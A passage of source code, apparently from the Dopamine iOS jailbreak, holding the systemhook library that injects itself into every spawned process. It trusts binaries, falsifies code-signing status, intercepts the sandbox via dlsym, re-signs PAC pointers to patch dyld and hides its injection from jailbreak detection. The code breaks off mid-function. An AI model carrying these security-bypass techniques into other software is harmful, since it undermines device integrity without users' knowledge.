CFLAGS = -I../.include -I./src -I../_external/modules/litehook/src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -install_name @loader_path/$(TARGET) -Wno-deprecated-declarations -Os -moutline
LDFLAGS = -dynamiclib

sign: $(TARGET)
	@ldid -S $^

$(TARGET): $(wildcard src/*.c src/*.m ../libjailbreak/src/jbclient_*.c ../_external/modules/litehook/src/*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/systemhook/src/common.c`:

```c
#include "common.h"
#include <xpc/xpc.h>
#include "launchd.h"
#include <mach-o/dyld.h>
#include <sys/param.h>
#include <sys/mount.h>
#include <sandbox.h>
#include <paths.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include "envbuf.h"
#include "private.h"
#include <libjailbreak/jbclient_xpc.h>
#include <libjailbreak/jbserver_domains.h>

bool string_has_prefix(const char *str, const char* prefix)
{
	if (!str || !prefix) {
		return false;
	}

	size_t str_len = strlen(str);
	size_t prefix_len = strlen(prefix);

	if (str_len < prefix_len) {
		return false;
	}

	return !strncmp(str, prefix, prefix_len);
}

bool string_has_suffix(const char* str, const char* suffix)
{
	if (!str || !suffix) {
		return false;
	}

	size_t str_len = strlen(str);
	size_t suffix_len = strlen(suffix);

	if (str_len < suffix_len) {
		return false;
	}

	return !strcmp(str + str_len - suffix_len, suffix);
}

void string_enumerate_components(const char *string, const char *separator, void (^enumBlock)(const char *pathString, bool *stop))
{
	char *stringCopy = strdup(string);
	char *curString = strtok(stringCopy, separator);
	while (curString != NULL) {
		bool stop = false;
		enumBlock(curString, &stop);
		if (stop) break;
		curString = strtok(NULL, separator);
	}
	free(stringCopy);
}

static kSpawnConfig spawn_config_for_executable(const char* path, char *const argv[restrict])
{
	// Blacklist to ensure general system stability
	// I don't like this but for some processes it seems neccessary
	const char *processBlacklist[] = {
		"/System/Library/Frameworks/GSS.framework/Helpers/GSSCred",
		"/System/Library/PrivateFrameworks/DataAccess.framework/Support/dataaccessd",
		"/System/Library/PrivateFrameworks/IDSBlastDoorSupport.framework/XPCServices/IDSBlastDoorService.xpc/IDSBlastDoorService",
		"/System/Library/PrivateFrameworks/MessagesBlastDoorSupport.framework/XPCServices/MessagesBlastDoorService.xpc/MessagesBlastDoorService",
	};
	size_t blacklistCount = sizeof(processBlacklist) / sizeof(processBlacklist[0]);
	for (size_t i = 0; i < blacklistCount; i++)
	{
		if (!strcmp(processBlacklist[i], path)) return 0;
	}

	return (kSpawnConfigInject | kSpawnConfigTrust);
}

int __posix_spawn_orig(pid_t *restrict pid, const char *restrict path, struct _posix_spawn_args_desc *desc, char *const argv[restrict], char * const envp[restrict])
{
	return syscall(SYS_posix_spawn, pid, path, desc, argv, envp);
}

int __execve_orig(const char *path, char *const argv[], char *const envp[])
{
	return syscall(SYS_execve, path, argv, envp);
}

// 1. Ensure the binary about to be spawned and all of it's dependencies are trust cached
// 2. Insert "DYLD_INSERT_LIBRARIES=/usr/lib/systemhook.dylib" into all binaries spawned
// 3. Increase Jetsam limit to more sane value (Multipler defined as JETSAM_MULTIPLIER)

static int spawn_exec_hook_common(const char *path,
								  char *const argv[restrict],
								  char *const envp[restrict],
			   struct _posix_spawn_args_desc *desc,
										int (*trust_binary)(const char *path),
									   double jetsamMultiplier,
									    int (^orig)(char *const envp[restrict]))
{
	if (!path) {
		return orig(envp);
	}

	posix_spawnattr_t attr = NULL;
	if (desc) attr = desc->attrp;

	kSpawnConfig spawnConfig = spawn_config_for_executable(path, argv);

	if (spawnConfig & kSpawnConfigTrust) {
		// Upload binary to trustcache if needed
		trust_binary(path);
	}

	const char *existingLibraryInserts = envbuf_getenv((const char **)envp, "DYLD_INSERT_LIBRARIES");
	__block bool systemHookAlreadyInserted = false;
	if (existingLibraryInserts) {
		string_enumerate_components(existingLibraryInserts, ":", ^(const char *existingLibraryInsert, bool *stop) {
			if (!strcmp(existingLibraryInsert, HOOK_DYLIB_PATH)) {
				systemHookAlreadyInserted = true;
			}
		});
	}

	int JBEnvAlreadyInsertedCount = (int)systemHookAlreadyInserted;

	// Check if we can find at least one reason to not insert jailbreak related environment variables
	// In this case we also need to remove pre existing environment variables if they are already set
	bool shouldInsertJBEnv = true;
	bool hasSafeModeVariable = false;
	do {
		if (!(spawnConfig & kSpawnConfigInject)) {
			shouldInsertJBEnv = false;
			break;
		}

		// Check if we can find a _SafeMode or _MSSafeMode variable
		// In this case we do not want to inject anything
		const char *safeModeValue = envbuf_getenv((const char **)envp, "_SafeMode");
		const char *msSafeModeValue = envbuf_getenv((const char **)envp, "_MSSafeMode");
		if (safeModeValue) {
			if (!strcmp(safeModeValue, "1")) {
				shouldInsertJBEnv = false;
				hasSafeModeVariable = true;
				break;
			}
		}
		if (msSafeModeValue) {
			if (!strcmp(msSafeModeValue, "1")) {
				shouldInsertJBEnv = false;
				hasSafeModeVariable = true;
				break;
			}
		}

		int proctype = 0;
		if (posix_spawnattr_getprocesstype_np(&attr, &proctype) == 0) {
			if (proctype == POSIX_SPAWN_PROC_TYPE_DRIVER) {
				// Do not inject hook into DriverKit drivers
				shouldInsertJBEnv = false;
				break;
			}
		}

		if (access(HOOK_DYLIB_PATH, F_OK) != 0) {
			// If the hook dylib doesn't exist, don't try to inject it (would crash the process)
			shouldInsertJBEnv = false;
			break;
		}
	} while (0);

	// If systemhook is being injected and jetsam limits are set, increase them by a factor of jetsamMultiplier
	if (shouldInsertJBEnv) {
		uint8_t *attrStruct = (uint8_t *)attr;
		if (attrStruct) {
			if (jetsamMultiplier == 0 || isnan(jetsamMultiplier)) jetsamMultiplier = 3; // default value (3x)
			if (jetsamMultiplier > 1) {
				int memlimit_active = *(int*)(attrStruct + POSIX_SPAWNATTR_OFF_MEMLIMIT_ACTIVE);
				if (memlimit_active != -1) {
					*(int*)(attrStruct + POSIX_SPAWNATTR_OFF_MEMLIMIT_ACTIVE) = memlimit_active * jetsamMultiplier;
				}
				int memlimit_inactive = *(int*)(attrStruct + POSIX_SPAWNATTR_OFF_MEMLIMIT_INACTIVE);
				if (memlimit_inactive != -1) {
					*(int*)(attrStruct + POSIX_SPAWNATTR_OFF_MEMLIMIT_INACTIVE) = memlimit_inactive * jetsamMultiplier;
				}
			}
		}
	}

	int r = -1;

	if ((shouldInsertJBEnv && JBEnvAlreadyInsertedCount == 1) || (!shouldInsertJBEnv && JBEnvAlreadyInsertedCount == 0 && !hasSafeModeVariable)) {
		// we're already good, just call orig
		r = orig(envp);
	}
	else {
		// the state we want to be in is not the state we are in right now

		char **envc = envbuf_mutcopy((const char **)envp);

		if (shouldInsertJBEnv) {
			if (!systemHookAlreadyInserted) {
				char newLibraryInsert[strlen(HOOK_DYLIB_PATH) + (existingLibraryInserts ? (strlen(existingLibraryInserts) + 1) : 0) + 1];
				strcpy(newLibraryInsert, HOOK_DYLIB_PATH);
				if (existingLibraryInserts) {
					strcat(newLibraryInsert, ":");
					strcat(newLibraryInsert, existingLibraryInserts);
				}
				envbuf_setenv(&envc, "DYLD_INSERT_LIBRARIES", newLibraryInsert);
			}
		}
		else {
			if (systemHookAlreadyInserted && existingLibraryInserts) {
				if (!strcmp(existingLibraryInserts, HOOK_DYLIB_PATH)) {
					envbuf_unsetenv(&envc, "DYLD_INSERT_LIBRARIES");
				}
				else {
					char *newLibraryInsert = malloc(strlen(existingLibraryInserts)+1);
					newLibraryInsert[0] = '\0';

					__block bool first = true;
					string_enumerate_components(existingLibraryInserts, ":", ^(const char *existingLibraryInsert, bool *stop) {
						if (strcmp(existingLibraryInsert, HOOK_DYLIB_PATH) != 0) {
							if (first) {
								strcpy(newLibraryInsert, existingLibraryInsert);
								first = false;
							}
							else {
								strcat(newLibraryInsert, ":");
								strcat(newLibraryInsert, existingLibraryInsert);
							}
						}
					});
					envbuf_setenv(&envc, "DYLD_INSERT_LIBRARIES", newLibraryInsert);

					free(newLibraryInsert);
				}
			}
			envbuf_unsetenv(&envc, "_SafeMode");
			envbuf_unsetenv(&envc, "_MSSafeMode");
		}

		r = orig(envc);

		envbuf_free(envc);
	}

	return r;
}

int posix_spawn_hook_shared(pid_t *restrict pid, 
					   const char *restrict path,
			 struct _posix_spawn_args_desc *desc,
						  	    char *const argv[restrict],
					   			char *const envp[restrict],
					   				  void *orig,
					   				  int (*trust_binary)(const char *path),
					   				  int (*set_process_debugged)(uint64_t pid, bool fullyDebugged),
					   				 double jetsamMultiplier)
{
	int (*posix_spawn_orig)(pid_t *restrict, const char *restrict, struct _posix_spawn_args_desc *, char *const[restrict], char *const[restrict]) = orig;

	int r = spawn_exec_hook_common(path, argv, envp, desc, trust_binary, jetsamMultiplier, ^int(char *const envp_patched[restrict]) {
		return posix_spawn_orig(pid, path, desc, argv, envp_patched);
	});

	if (r == 0 && pid && desc) {
		posix_spawnattr_t attr = desc->attrp;
		short flags = 0;
		if (posix_spawnattr_getflags(&attr, &flags) == 0) {
			if (flags & POSIX_SPAWN_START_SUSPENDED) {
				// If something spawns a process as suspended, ensure mapping invalid pages in it is possible
				// Normally it would only be possible after systemhook.dylib enables it
				// Fixes Frida issues
				int r = set_process_debugged(*pid, false);
			}
		}
	}

	return r;
}

int execve_hook_shared(const char *path,
					   char *const argv[],
					   char *const envp[],
			 				 void *orig,
			 				 int (*trust_binary)(const char *path))
{
	int (*execve_orig)(const char *, char *const[], char *const[]) = orig;

	int r = spawn_exec_hook_common(path, argv, envp, NULL, trust_binary, 0, ^int(char *const envp_patched[restrict]){
		return execve_orig(path, argv, envp_patched);
	});

	return r;
}

```

`BaseBin/systemhook/src/common.h`:

```h
#include <CoreFoundation/CoreFoundation.h>
#include <spawn.h>
#include <xpc/xpc.h>
#include "private.h"

#define HOOK_DYLIB_PATH "/usr/lib/systemhook.dylib"

typedef enum 
{
	kSpawnConfigInject = 1 << 0,
	kSpawnConfigTrust = 1 << 1,
} kSpawnConfig;

int __posix_spawn(pid_t *restrict pid, const char *restrict path, struct _posix_spawn_args_desc *desc, char *const argv[restrict], char *const envp[restrict]);
int __execve(const char *path, char *const argv[], char *const envp[]);

bool string_has_prefix(const char *str, const char* prefix);
bool string_has_suffix(const char* str, const char* suffix);

int __posix_spawn_orig(pid_t *restrict pid, const char *restrict path, struct _posix_spawn_args_desc *desc, char *const argv[restrict], char * const envp[restrict]);
int __execve_orig(const char *path, char *const argv[], char *const envp[]);

int resolvePath(const char *file, const char *searchPath, int (^attemptHandler)(char *path));
int posix_spawn_hook_shared(pid_t *restrict pid, const char *restrict path, struct _posix_spawn_args_desc *desc, char *const argv[restrict], char *const envp[restrict], void *orig, int (*trust_binary)(const char *path), int (*set_process_debugged)(uint64_t pid, bool fullyDebugged), double jetsamMultiplier);
int execve_hook_shared(const char *path, char *const argv[], char *const envp[], void *orig, int (*trust_binary)(const char *path));
```

`BaseBin/systemhook/src/envbuf.c`:

```c
#include <stdlib.h>
#include <string.h>

int envbuf_len(const char *envp[])
{
	if (envp == NULL) return 1;

	int k = 0;
	const char *env = envp[k++];
	while (env != NULL) {
		env = envp[k++];
	}
	return k;
}

char **envbuf_mutcopy(const char *envp[])
{
	if (envp == NULL) return NULL;

	int len = envbuf_len(envp);
	char **envcopy = malloc(len * sizeof(char *));

	for (int i = 0; i < len-1; i++) {
		envcopy[i] = strdup(envp[i]);
	}
	envcopy[len-1] = NULL;

	return envcopy;
}

void envbuf_free(char *envp[])
{
	if (envp == NULL) return;

	int len = envbuf_len((const char**)envp);
	for (int i = 0; i < len-1; i++) {
		free(envp[i]);
	}
	free(envp);
}

int envbuf_find(const char *envp[], const char *name)
{
	if (envp) {
		unsigned long nameLen = strlen(name);
		int k = 0;
		const char *env = envp[k++];
		while (env != NULL) {
			unsigned long envLen = strlen(env);
			if (envLen > nameLen) {
				if (!strncmp(env, name, nameLen)) {
					if (env[nameLen] == '=') {
						return k-1;
					}
				}
			}
			env = envp[k++];
		}
	}
	return -1;
}

const char *envbuf_getenv(const char *envp[], const char *name)
{
	if (envp) {
		unsigned long nameLen = strlen(name);
		int envIndex = envbuf_find(envp, name);
		if (envIndex >= 0) {
			return &envp[envIndex][nameLen+1];
		}
	}
	return NULL;
}

void envbuf_setenv(char **envpp[], const char *name, const char *value)
{
	if (envpp) {
		char **envp = *envpp;
		if (!envp) {
			// treat NULL as [NULL]
			envp = malloc(sizeof(const char *));
			envp[0] = NULL;
		}

		char *envToSet = malloc(strlen(name)+strlen(value)+2);
		strcpy(envToSet, name);
		strcat(envToSet, "=");
		strcat(envToSet, value);

		int existingEnvIndex = envbuf_find((const char **)envp, name);
		if (existingEnvIndex >= 0) {
			// if already exists: deallocate old variable, then replace pointer
			free(envp[existingEnvIndex]);
			envp[existingEnvIndex] = envToSet;
		}
		else {
			// if doesn't exist yet: increase env buffer size, place at end
			int prevLen = envbuf_len((const char **)envp);
			*envpp = realloc(envp, (prevLen+1)*sizeof(const char *));
			envp = *envpp;
			envp[prevLen-1] = envToSet;
			envp[prevLen] = NULL;
		}
	}
}

void envbuf_unsetenv(char **envpp[], const char *name)
{
	if (envpp) {
		char **envp = *envpp;
		if (!envp) return;

		int existingEnvIndex = envbuf_find((const char **)envp, name);
		if (existingEnvIndex >= 0) {
			free(envp[existingEnvIndex]);
			int prevLen = envbuf_len((const char **)envp);
			for (int i = existingEnvIndex; i < (prevLen-1); i++) {
				envp[i] = envp[i+1];
			}
			*envpp = realloc(envp, (prevLen-1)*sizeof(const char *));
		}
	}
}

```

`BaseBin/systemhook/src/envbuf.h`:

```h
int envbuf_len(const char *envp[]);
char **envbuf_mutcopy(const char *envp[]);
void envbuf_free(char *envp[]);
int envbuf_find(const char *envp[], const char *name);
const char *envbuf_getenv(const char *envp[], const char *name);
void envbuf_setenv(char **envpp[], const char *name, const char *value);
void envbuf_unsetenv(char **envpp[], const char *name);
```

`BaseBin/systemhook/src/launchd.h`:

```h
#define OS_ALLOC_ONCE_KEY_MAX    100

struct _os_alloc_once_s {
	long once;
	void *ptr;
};

struct xpc_global_data {
	uint64_t    a;
	uint64_t    xpc_flags;
	mach_port_t    task_bootstrap_port;  /* 0x10 */
#ifndef _64
	uint32_t    padding;
#endif
	xpc_object_t    xpc_bootstrap_pipe;   /* 0x18 */
	// and there's more, but you'll have to wait for MOXiI 2 for those...
	// ...
};

extern struct _os_alloc_once_s _os_alloc_once_table[];
extern void* _os_alloc_once(struct _os_alloc_once_s *slot, size_t sz, os_function_t init);

```

`BaseBin/systemhook/src/main.c`:

```c
#include "common.h"

#include <mach-o/dyld.h>
#include <mach-o/dyld_images.h>
#include <mach-o/getsect.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <paths.h>
#include <util.h>
#include <ptrauth.h>
#include <libjailbreak/jbclient_xpc.h>
#include <libjailbreak/codesign.h>
#include <libjailbreak/jbroot.h>
#include "../dyldhook/src/dyld_jbinfo.h"
#include "litehook.h"
#include "sandbox.h"
#include "private.h"

bool gFullyDebugged = false;
static void *gLibSandboxHandle;
char *JB_BootUUID = NULL;
char *JB_RootPath = NULL;
char *get_jbroot(void) { return JB_RootPath; }

static char gExecutablePath[PATH_MAX];
static int load_executable_path(void)
{
	char executablePath[PATH_MAX];
	uint32_t bufsize = PATH_MAX;
	if (_NSGetExecutablePath(executablePath, &bufsize) == 0) {
		if (realpath(executablePath, gExecutablePath) != NULL) return 0;
	}
	return -1;
}

static char *JB_SandboxExtensions = NULL;

void consume_tokenized_sandbox_extensions(char *sandboxExtensions)
{
	if (sandboxExtensions[0] == '\0') return;

	char *it = sandboxExtensions;
	char *last = sandboxExtensions;
	while (*(++it) != '\0') {
		if (*it == '|') {
			*it = '\0';
			sandbox_extension_consume(last);
			last = &it[1];
			*it = '|';
		}
	}
	sandbox_extension_consume(last);
}

void *(*sandbox_apply_orig)(void *) = NULL;
void *sandbox_apply_hook(void *a1)
{
	void *r = sandbox_apply_orig(a1);
	consume_tokenized_sandbox_extensions(JB_SandboxExtensions);
	return r;
}

int dyld_hook_routine(void **dyld, int idx, void *hook, void **orig, uint16_t pacSalt)
{
	if (!dyld) return -1;

	uint64_t dyldPacDiversifier = ((uint64_t)dyld & ~(0xFFFFull << 48)) | (0x63FAull << 48);
	void **dyldFuncPtrs = ptrauth_auth_data(*dyld, ptrauth_key_process_independent_data, dyldPacDiversifier);
	if (!dyldFuncPtrs) return -1;

	if (vm_protect(mach_task_self_, (mach_vm_address_t)&dyldFuncPtrs[idx], sizeof(void *), false, VM_PROT_READ | VM_PROT_WRITE) == 0) {
		uint64_t location = (uint64_t)&dyldFuncPtrs[idx];
		uint64_t pacDiversifier = (location & ~(0xFFFFull << 48)) | ((uint64_t)pacSalt << 48);

		*orig = ptrauth_auth_and_resign(dyldFuncPtrs[idx], ptrauth_key_process_independent_code, pacDiversifier, ptrauth_key_function_pointer, 0);
		dyldFuncPtrs[idx] = ptrauth_auth_and_resign(hook, ptrauth_key_function_pointer, 0, ptrauth_key_process_independent_code, pacDiversifier);
		vm_protect(mach_task_self_, (mach_vm_address_t)&dyldFuncPtrs[idx], sizeof(void *), false, VM_PROT_READ);
		return 0;
	}

	return -1;
}

// dlsym calls use __builtin_return_address(0) to determine what library called it
// Since we hook them, if we just call the original function on our own, the return address will always point to systemhook
// Therefore we must ensure the call to the original function is a tail call, which ensures that the stack and lr are restored and the compiler turns the call into a direct branch
// This is done via __attribute__((musttail)), this way __builtin_return_address(0) will point to the original calling library instead of systemhook

void *(*dyld_dlsym_orig)(void *dyld, void *handle, const char *name);
void *dyld_dlsym_hook(void *dyld, void *handle, const char *name)
{
	if (handle == gLibSandboxHandle && !strcmp(name, "sandbox_apply")) {
		// We abuse the fact that libsystem_sandbox will call dlsym to get the sandbox_apply pointer here
		// Because we can just return a different pointer, we avoid doing instruction replacements
		return sandbox_apply_hook;
	}
	__attribute__((musttail)) return dyld_dlsym_orig(dyld, handle, name);
}

int ptrace_hook(int request, pid_t pid, caddr_t addr, int data)
{
	int r = syscall(SYS_ptrace, request, pid, addr, data);

	// ptrace works on any process when the caller is unsandboxed,
	// but when the victim process does not have the get-task-allow entitlement,
	// it will fail to set the debug flags, therefore we patch ptrace to manually apply them
	// processes that have tweak injection enabled will have their debug flags already set
	// this is only relevant for ones that don't, e.g. if you disable tweak injection on an app via choicy
	// but still want to be able to attach a debugger to them
	if (r == 0 && (request == PT_ATTACHEXC || request == PT_ATTACH)) {
		jbclient_platform_set_process_debugged(pid, true);
		jbclient_platform_set_process_debugged(getpid(), true);
	}

	return r;
}

#ifndef __arm64e__

// The NECP subsystem is the only thing in the kernel that ever checks CS_VALID on userspace processes (Only on iOS >=16)
// In order to not break system functionality, we need to readd CS_VALID before any of these are invoked

int necp_match_policy_hook(uint8_t *parameters, size_t parameters_size, void *returned_result)
{
	jbclient_cs_revalidate();
	return syscall(SYS_necp_match_policy, parameters, parameters_size, returned_result);
}

int necp_open_hook(int flags)
{
	jbclient_cs_revalidate();
	return syscall(SYS_necp_open, flags);
}

int necp_client_action_hook(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
	jbclient_cs_revalidate();
	return syscall(SYS_necp_client_action, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

int necp_session_open_hook(int flags)
{
	jbclient_cs_revalidate();
	return syscall(SYS_necp_session_open, flags);
}

int necp_session_action_hook(int necp_fd, uint32_t action, uint8_t *in_buffer, size_t in_buffer_length, uint8_t *out_buffer, size_t out_buffer_length)
{
	jbclient_cs_revalidate();
	return syscall(SYS_necp_session_action, necp_fd, action, in_buffer, in_buffer_length, out_buffer, out_buffer_length);
}

// For the userland, there are multiple processes that will check CS_VALID for one reason or another
// As we inject system wide (or at least almost system wide), we can just patch the source of the info though - csops itself
// Additionally we also remove CS_DEBUGGED while we're at it, as on arm64e this also is not set and everything is fine
// That way we have unified behaviour between both arm64 and arm64e

int csops_hook(pid_t pid, unsigned int ops, void *useraddr, size_t usersize)
{
	int rv = syscall(SYS_csops, pid, ops, useraddr, usersize);
	if (rv != 0) return rv;
	if (ops == CS_OPS_STATUS) {
		if (useraddr && usersize == sizeof(uint32_t)) {
			uint32_t* csflag = (uint32_t *)useraddr;
			*csflag |= CS_VALID;
			*csflag &= ~CS_DEBUGGED;
			if (pid == getpid() && gFullyDebugged) {
				*csflag |= CS_DEBUGGED;
			}
		}
	}
	return rv;
}

int csops_audittoken_hook(pid_t pid, unsigned int ops, void *useraddr, size_t usersize, audit_token_t *token)
{
	int rv = syscall(SYS_csops_audittoken, pid, ops, useraddr, usersize, token);
	if (rv != 0) return rv;
	if (ops == CS_OPS_STATUS) {
		if (useraddr && usersize == sizeof(uint32_t)) {
			uint32_t* csflag = (uint32_t *)useraddr;
			*csflag |= CS_VALID;
			*csflag &= ~CS_DEBUGGED;
			if (pid == getpid() && gFullyDebugged) {
				*csflag |= CS_DEBUGGED;
			}
		}
	}
	return rv;
}

#endif

bool should_enable_tweaks(void)
{
	if (access(JBROOT_PATH("/basebin/.safe_mode"), F_OK) == 0) {
		return false;
	}

	char *tweaksDisabledEnv = getenv("DISABLE_TWEAKS");
	if (tweaksDisabledEnv) {
		if (!strcmp(tweaksDisabledEnv, "1")) {
			return false;
		}
	}

	const char *tweaksDisabledPathSuffixes[] = {
		// System binaries
		"/usr/libexec/xpcproxy",

		// Dopamine app itself (jailbreak detection bypass tweaks can break it)
		"Dopamine.app/Dopamine",
	};
	for (size_t i = 0; i < sizeof(tweaksDisabledPathSuffixes) / sizeof(const char*); i++) {
		if (string_has_suffix(gExecutablePath, tweaksDisabledPathSuffixes[i])) return false;
	}

	if (__builtin_available(iOS 16.0, *)) {
		// These seem to be problematic on iOS 16+ (dyld gets stuck in a weird way when opening TweakLoader)
		const char *iOS16TweaksDisabledPaths[] = {
			"/usr/libexec/logd",
			"/usr/sbin/notifyd",
			"/usr/libexec/usermanagerd",
		};
		for (size_t i = 0; i < sizeof(iOS16TweaksDisabledPaths) / sizeof(const char*); i++) {
			if (!strcmp(gExecutablePath, iOS16TweaksDisabledPaths[i])) return false;
		}
	}

	return true;
}

int __posix_spawn_hook(pid_t *restrict pid, const char *restrict path, struct _posix_spawn_args_desc *desc, char *const argv[restrict], char * const envp[restrict])
{
	return posix_spawn_hook_shared(pid, path, desc, argv, envp, (void *)__posix_spawn_orig, jbclient_trust_file_by_path, jbclient_platform_set_process_debugged, jbclient_jbsettings_get_double("jetsamMultiplier"));
}

int __posix_spawn_hook_with_filter(pid_t *restrict pid, const char *restrict path, char *const argv[restrict], char * const envp[restrict], struct _posix_spawn_args_desc *desc, int *ret)
{
	*ret = posix_spawn_hook_shared(pid, path, desc, argv, envp, (void *)__posix_spawn_orig, jbclient_trust_file_by_path, jbclient_platform_set_process_debugged, jbclient_jbsettings_get_double("jetsamMultiplier"));
	return 1;
}

int __execve_hook(const char *path, char *const argv[], char *const envp[])
{
	return execve_hook_shared(path, argv, envp, (void *)__execve_orig, jbclient_trust_file_by_path);
}

const struct mach_header_64 *get_dyld_mach_header(void)
{
	static const struct mach_header_64 *dyldMachHeader = NULL;
	static dispatch_once_t onceToken;
	dispatch_once (&onceToken, ^{
		task_dyld_info_data_t dyldInfo;
		uint32_t count = TASK_DYLD_INFO_COUNT;
		kern_return_t kr = task_info(mach_task_self_, TASK_DYLD_INFO, (task_info_t)&dyldInfo, &count);
		if (kr == KERN_SUCCESS) {
			struct dyld_all_image_infos *infos = (struct dyld_all_image_infos *)dyldInfo.all_image_info_addr;
			dyldMachHeader = (const struct mach_header_64 *)infos->dyldImageLoadAddress;
		}
	});
	return dyldMachHeader;
}

int parse_dyldhook_jbinfo(char **jbRootPathOut, char **bootUUIDOut, char **sandboxExtensionsOut, bool *fullyDebuggedOut)
{
	// Get dyld header
	const struct mach_header_64 *dyldHeader = get_dyld_mach_header();
	if (!dyldHeader) return -1;

	// Check if dyld LC_UUID contains dopamine magic
	uuid_t dyldUUID;
	if (!_dyld_get_image_uuid((const struct mach_header *)dyldHeader, dyldUUID)) return -2;
	if (!string_has_prefix((char *)dyldUUID, "DOPA")) return -3;

	// If so, get __jbinfo section
	size_t jbInfoSize = 0;
	struct dyld_jbinfo *jbInfo = (struct dyld_jbinfo *)getsectiondata(dyldHeader, "__DATA", "__jbinfo", &jbInfoSize);
	if (!jbInfo) return -4;

	// Check if dyld already performed check-in
	if (jbInfo->state != DYLD_STATE_CHECKED_IN) return -5;

	// If so, parse jbinfo
	if (jbRootPathOut)        *jbRootPathOut        = jbInfo->jbRootPath;
	if (bootUUIDOut)          *bootUUIDOut          = jbInfo->bootUUID;
	if (sandboxExtensionsOut) *sandboxExtensionsOut = jbInfo->sandboxExtensions;
	if (fullyDebuggedOut)     *fullyDebuggedOut     = jbInfo->fullyDebugged;

	return 0;
}

__attribute__((constructor)) static void initializer(void)
{	
	// Under normal circumstances, dyldhook will have already handled the check-in, so get the check-in information from the __jbinfo section
	// For more information on the check-in process, check the comments in dyldhook
	if (parse_dyldhook_jbinfo(&JB_RootPath, &JB_BootUUID, &JB_SandboxExtensions, &gFullyDebugged) != 0) {
		// If under any circumstances dyldhook has *not* performed a check-in, do it now
		// This code path is taken inside xpcproxy on iOS 16, because launchd apparently no longer passes it a bootstrap port
		if (jbclient_process_checkin(&JB_RootPath, &JB_BootUUID, &JB_SandboxExtensions, &gFullyDebugged) == 0) {
			consume_tokenized_sandbox_extensions(JB_SandboxExtensions);
		}
		else {
			// If neither dyldhook nor systemhook managed to perform the check-in, something is very wrong and the best thing we can do is bail out
			// Should realistically never happen though
			return;
		}
	}

	// Unset DYLD_INSERT_LIBRARIES, but only if systemhook itself is the only thing contained in it
	// Feeable attempt at making jailbreak detection harder
	const char *dyldInsertLibraries = getenv("DYLD_INSERT_LIBRARIES");
	if (dyldInsertLibraries) {
		if (!strcmp(dyldInsertLibraries, HOOK_DYLIB_PATH)) {
			unsetenv("DYLD_INSERT_LIBRARIES");
		}
	}

	// Apply posix_spawn / execve hooks
	if (__builtin_available(iOS 16.0, *)) {
		litehook_hook_function(__posix_spawn, __posix_spawn_hook);
		litehook_hook_function(__execve,      __execve_hook);
	}
	else {
		// On iOS 15 there is a way to hook posix_spawn and execve without doing instruction replacements
		// Unfortunately Apple decided to remove these in iOS 16 :(

		void **posix_spawn_with_filter = litehook_find_dsc_symbol("/usr/lib/system/libsystem_kernel.dylib", "_posix_spawn_with_filter");
		void **execve_with_filter      = litehook_find_dsc_symbol("/usr/lib/system/libsystem_kernel.dylib", "_execve_with_filter");

		*posix_spawn_with_filter = __posix_spawn_hook_with_filter;
		*execve_with_filter      = __execve_hook;
	}

	// Hook the dyld_shared_cache __fcntl to jump to the dyld __fcntl instead
	// This makes it so that library validation is also bypassed if someone calls fcntl in userspace to attach a signature manually
	void *dyld___fcntl = litehook_find_symbol(get_dyld_mach_header(), "___fcntl");
	extern int __fcntl(int fd, int op, ... /* arg */ );
	litehook_hook_function(__fcntl, dyld___fcntl);

	// Initialize stuff neccessary for sandbox_apply hook
	gLibSandboxHandle = dlopen("/usr/lib/libsandbox.1.dylib", RTLD_FIRST | RTLD_LOCAL | RTLD_LAZY);
	sandbox_apply_orig = dlsym(gLibSandboxHandle, "sandbox_apply");

	// Apply dyld hooks
	void ***gDyldPtr = litehook_find_dsc_symbol("/usr/lib/system/libdyld.dylib", "__ZN5dyld45gDyldE");
	if (gDyldPtr) {
		// TODO: Maybe we can just rebind sandbox_apply instead?
		dyld_hook_routine(*gDyldPtr, 17, (void *)&dyld_dlsym_hook, (void **)&dyld_dlsym_orig, 0x839D);
	}

#ifdef __arm64e__
	// Since pages have been modified in this process, we need to load forkfix to ensure forking will work
	// Optimization: If the process cannot fork at all due to sandbox, we don't need to do anything
	if (sandbox_check(getpid(), "process-fork", SANDBOX_CHECK_NO_REPORT, NULL) == 0) {
		dlopen(JBROOT_PATH("/basebin/forkfix.dylib"), RTLD_NOW);
	}
#endif

	if (load_executable_path() == 0) {
		// Load rootlesshooks / watchdoghook when neccessary
		if (!strcmp(gExecutablePath, "/usr/sbin/cfprefsd") ||
			!strcmp(gExecutablePath, "/System/Library/CoreServices/SpringBoard.app/SpringBoard") ||
			!strcmp(gExecutablePath, "/usr/libexec/lsd")) {
			dlopen(JBROOT_PATH("/basebin/rootlesshooks.dylib"), RTLD_NOW);
		}
		else if (!strcmp(gExecutablePath, "/usr/libexec/watchdogd")) {
			dlopen(JBROOT_PATH("/basebin/watchdoghook.dylib"), RTLD_NOW);
		}

		// ptrace hook to allow attaching a debugger to processes that systemhook did not inject into
		// e.g. allows attaching debugserver to an app where tweak injection has been disabled via choicy
		// since we want to keep hooks minimal and debugserver is the only thing I can think of that would
		// call ptrace and expect it to allow invalid pages, we only hook it in debugserver
		// this check is a bit shit since we rely on the name of the binary, but who cares ¯\_(ツ)_/¯
		if (string_has_suffix(gExecutablePath, "/debugserver")) {
			litehook_hook_function(ptrace, ptrace_hook);
		}

#ifndef __arm64e__
		// On arm64, writing to executable pages removes CS_VALID from the csflags of the process
		// These hooks are neccessary to get the system to behave with this (since multiple system APIs check for CS_VALID and produce failures if it's not set)
		// They are ugly but needed
		litehook_hook_function(csops, csops_hook);
		litehook_hook_function(csops_audittoken, csops_audittoken_hook);
		if (__builtin_available(iOS 16.0, *)) {
			litehook_hook_function(necp_match_policy, necp_match_policy_hook);
			litehook_hook_function(necp_open, necp_open_hook);
			litehook_hook_function(necp_client_action, necp_client_action_hook);
			litehook_hook_function(necp_session_open, necp_session_open_hook);
			litehook_hook_function(necp_session_action, necp_session_action_hook);
		}
#endif
		// Load tweaks if desired
		// We can hardcode /var/jb here since if it doesn't exist, loading TweakLoader.dylib is not going to work anyways
		if (should_enable_tweaks()) {
